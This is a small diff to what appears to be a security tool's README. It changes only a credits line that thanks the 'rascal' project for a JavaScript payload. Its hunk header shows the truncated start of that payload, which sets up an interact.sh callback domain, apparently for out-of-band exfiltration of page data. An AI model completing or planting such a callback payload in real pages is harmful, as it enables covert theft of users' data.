@@ -22,4 +22,4 @@ t=40;dm='cb364rdve0qv08pghjmgcmdgr5eyyyyyn.interact.sh';k2="-None";d=document;c=
 
 #### Thanks
 
-https://github.com/gum0x/rascal (that JS payload was inspired (~copied~) from here. I've only made some changes)
+https://github.com/gum0x/rascal (that JS payload was ~copied~ inspired from here. I've only made some changes)
